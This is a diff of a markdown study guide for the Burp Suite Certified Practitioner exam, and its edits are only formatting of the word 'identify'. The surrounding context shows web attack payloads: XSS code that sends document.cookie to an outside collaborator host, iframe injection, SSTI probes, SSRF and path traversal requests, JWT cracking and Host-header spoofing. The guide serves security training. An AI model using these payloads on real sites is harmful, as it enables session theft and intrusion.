@@ -36,7 +36,7 @@
   
 ## DOM-Based XSS  
 
->DOM-based XSS vulnerabilities arise when JavaScript takes data from an attacker-controllable source, such as the URL, and passes code to a sink that supports dynamic code execution. Review the code to identify **source** and **sinks** that may lead to exploit, list of examples:  
+>DOM-based XSS vulnerabilities arise when JavaScript takes data from an attacker-controllable source, such as the URL, and passes code to a sink that supports dynamic code execution. Review the code to ***identify*** **source** and **sinks** that may lead to exploit, list of examples:  
 
 * document.write
 * window.location
@@ -55,7 +55,7 @@
 * location.search
 * addEventListener  
   
->AngularJS expression below can be injected into the search function when angle brackets and double quotes HTML-encoded. The vulnerability is identified by noticing the search string is enclosed in an **ng-app** directive. Review the HTML code to identify ng-app directive telling AngularJS that this is the root element of the AngularJS application.  
+>AngularJS expression below can be injected into the search function when angle brackets and double quotes HTML-encoded. The vulnerability is ***identified*** by noticing the search string is enclosed in an **ng-app** directive. Review the HTML code to ***identify*** ng-app directive telling AngularJS that this is the root element of the AngularJS application.  
 
 ![domxss-on-constructor.png](images/ng-app-code-review.png)  
 
@@ -104,7 +104,7 @@
 
 >The vulnerable JavaScript code on the target using event listener that listens for a web message. This event listener expects a **string** that is parsed using **JSON.parse()**. In the JavaScript below, we can see that the event listener expects a **type** property and that the **load-channel** case of the **switch** statement changes the **img src** attribute.  
 
->Identify web messages on target that is using **postmessage()** with **DOM Invader**.  
+>***Identify*** web messages on target that is using **postmessage()** with **DOM Invader**.  
 
 ```JavaScript
 <script>
@@ -224,7 +224,7 @@ document.cookie = "TopSecret=UnSafeCookieSessionValueForTopSecretCookie";
 <iframe src="https://TARGET.net/#" onload="this.src+='<img src=x onerror=print()>'"></iframe>
 ```  
 
->Note: Identify in below lab the vulnerable jquery 1.8.2 version used with the CSS selector to identify **hashchange**.  
+>Note: ***Identify*** in below lab the vulnerable jquery 1.8.2 version used with the CSS selector to identify **hashchange**.  
 
 ![Hashchange](images/hashchange.png)  
 
@@ -249,7 +249,7 @@ document.cookie = "TopSecret=UnSafeCookieSessionValueForTopSecretCookie";
 
 >In the **Search** function a Reflected XSS vulnerability is identified. The attacker then deliver an exploit link to victim with cookie stealing payload in a hosted **iframe** on their exploit server.  
 
->Identify The search JavaScript code on the target, return a JSON response. Validate that the backslash **\\** escape is not sanitized, and the JSON data is then send to **eval()**.  Backslash is not escaped correct and when the JSON response attempts to escape the opening double-quotes character, it adds a second backslash. The resulting double-backslash causes the escaping to be effectively canceled out.  
+>***Identify*** The search JavaScript code on the target, return a JSON response. Validate that the backslash **\\** escape is not sanitized, and the JSON data is then send to **eval()**.  Backslash is not escaped correct and when the JSON response attempts to escape the opening double-quotes character, it adds a second backslash. The resulting double-backslash causes the escaping to be effectively canceled out.  
 
 ```JavaScript
 \"-fetch('https://Collaborator.com?cs='+btoa(document.cookie))}//
@@ -417,7 +417,7 @@ document.location='https://collaboration.net/?cookies='+document.cookie;
 
 ### Spoof IP Address  
 
->Identify that altered HOST headers are supported, which allows you to spoof your IP address and bypass the IP-based brute-force protection or redirection attacks to do password reset poisoning.  
+>***Identify*** that altered HOST headers are supported, which allows you to spoof your IP address and bypass the IP-based brute-force protection or redirection attacks to do password reset poisoning.  
   
 >Change the username parameter to carlos and send the request.  
 
@@ -1215,7 +1215,7 @@ hacktricks xss cross site scripting server side xss dynamic pdf
 
 ### SSRF Open Redirection  
 
->The target make **GET** request to the next product on the ecommerce site, using a **path** parameter. On the stockAPI POPST request the value provided in body data is the partial path to interal system. The identification of this vulnerability is by testing various paths and observing the input path specified is reflected in the response **Location** header.  
+>The target make **GET** request to the next product on the ecommerce site, using a **path** parameter. On the stockAPI POPST request the value provided in body data is the partial path to interal system. The ***identification*** of this vulnerability is by testing various paths and observing the input path specified is reflected in the response **Location** header.  
 
 ![SSRF Open Redirect Location reflect](images/ssrf-open-edirect-location-reflect.png)  
 
@@ -1238,7 +1238,7 @@ stockApi=%2fproduct%2fnextProduct%3fcurrentProductId%3d1%26path%3dhttp%253a%2f%2
 
 >Use the web framework native template syntax to inject a malicious payload into a **{{template}}**, which is then executed server-side.  
 
->SSTI payloads to identify vulnerability.  
+>SSTI payloads to ***identify*** vulnerability.  
 
 ```
 ${{<%[%'"}}%\.,
@@ -1257,7 +1257,7 @@ ${foobar}
 {% debug %}
 ```  
 
->Identification of template injection.  
+>***Identification*** of template injection.  
 
 ![Identify SSTI](images/identify-ssti.png)  
 
@@ -1439,7 +1439,7 @@ hashcat -a 0 -m 16500 <YOUR-JWT> /path/to/jwt.secrets.list
   
 ### Referer CSRF  
 
->Identify change email vulnerable to the referer header to validate being part of the referer header value.  
+>***Identify*** change email vulnerable to the referer header to validate being part of the referer header value.  
 
 >Adding original domain of target and append it to the **Referer header** in the form of a query string, allow the change email to update.  
 
@@ -1533,7 +1533,7 @@ GET /admin_controls/metrics/admin-image?imagefile=%252e%252e%252f%252e%252e%252f
   
 # Approach  
 
->This is my personal view of the possible approach to leverage identified vulnerabilites that enable the progress through the BSCP exam stages.  
+>This is my personal view of the possible approach to leverage identified vulnerabilites and then using these notes to progress through the BSCP exam stages.  
 
 ![Three stages](images/3stages.png)  
 
